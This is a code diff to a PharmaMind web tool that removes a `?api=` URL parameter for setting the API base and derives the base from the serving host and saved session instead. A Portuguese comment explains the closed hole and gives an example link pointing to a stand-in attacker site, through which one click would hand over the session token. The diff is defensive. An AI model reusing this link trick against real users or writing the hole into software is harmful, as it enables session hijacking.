@@ -1769,14 +1769,26 @@ function testImageExportable(img){
   }
 }
 
-// Base da API e sessão do PharmaMind — lidas do link que abriu essa ferramenta
-// (?api=...) e do localStorage da própria sessão logada (mesmo domínio do front).
+// Base da API e sessão do PharmaMind — a sessão vem do localStorage da própria
+// sessão logada (mesmo domínio do front).
 // A busca automática de imagem passa pelo NOSSO backend (nunca direto pra
 // Anthropic): a chave fica só no servidor, e a rota é protegida por login de
 // gestor, já que cada chamada tem custo (usa busca na web).
+//
+// A base da API é SEMPRE derivada do host que serviu esta página — nunca de um
+// parâmetro da URL. Antes havia um override `?api=...`: como toda chamada daqui
+// manda o token da sessão no cabeçalho Authorization, um link do tipo
+// "...cartazes.html?api=https://site-do-atacante/api" fazia a ferramenta
+// entregar a sessão inteira pra quem montou o link, com um clique.
 function getApiBaseUrl(){
-  const fromQuery = new URLSearchParams(location.search).get('api');
-  if(fromQuery) return fromQuery;
+  // Vem da sessão salva pelo próprio app (mesmo origin), nunca da URL — ver o
+  // comentário acima sobre o antigo `?api=`.
+  try{
+    for(const key of ['drogaria:session:funcionario', 'drogaria:session:gestor']){
+      const raw = localStorage.getItem(key);
+      if(raw){ const base = (JSON.parse(raw)||{}).apiBaseUrl; if(base) return base; }
+    }
+  }catch(e){ /* sem sessão salva — cai no padrão abaixo */ }
   return location.protocol + '//' + location.hostname + ':3333/api';
 }
 function getAuthToken(){
